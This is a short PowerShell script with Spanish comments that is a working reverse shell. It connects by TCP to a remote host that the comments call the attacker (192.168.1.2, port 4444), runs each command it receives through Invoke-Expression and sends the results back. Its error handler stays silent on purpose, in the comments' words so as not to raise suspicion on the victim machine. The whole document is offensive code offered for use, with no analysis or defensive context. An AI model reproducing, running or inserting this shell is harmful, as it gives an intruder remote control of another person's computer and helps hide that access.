# --- CONFIGURACIÓN ---
$ip_remota = "192.168.1.2"
$puerto_remoto = 4444

# --- LÓGICA DE CONEXIÓN ---
try {
    # Establece la conexión TCP con el atacante
    $socket = New-Object System.Net.Sockets.TCPClient($ip_remota, $puerto_remoto)

    # Prepara los canales para leer y escribir datos
    $stream = $socket.GetStream()
    $lector = New-Object System.IO.StreamReader($stream)
    $escritor = New-Object System.IO.StreamWriter($stream)

    # Envía un mensaje de bienvenida al atacante
    $escritor.WriteLine("[+] Conexión recibida. Shell listo.")
    $escritor.Flush()

    # --- BUCLE PRINCIPAL DE COMANDOS ---
    while ($true) {
        # Muestra un prompt en la consola del atacante
        $escritor.Write("Shell> ")
        $escritor.Flush()

        # Lee el comando enviado por el atacante
        $comando = $lector.ReadLine()

        # Si el comando es "exit", cierra la conexión
        if ($comando -eq "exit") {
            break
        }

        # Ejecuta el comando y captura el resultado (incluyendo errores)
        $resultado = try {
            Invoke-Expression $comando 2>&1 | Out-String
        } catch {
            "Error ejecutando el comando: $_"
        }

        # Envía el resultado de vuelta al atacante
        $escritor.WriteLine($resultado)
        $escritor.Flush()
    }

    # Cierra todas las conexiones
    $escritor.Close()
    $lector.Close()
    $socket.Close()
}
catch {
    # Si algo falla (ej: el atacante no está escuchando), no hagas nada.
    # Así no se levantan sospechas en la máquina víctima.
    # Se podría añadir una lógica para reintentar la conexión cada cierto tiempo.
    Start-Sleep -Seconds 30
}
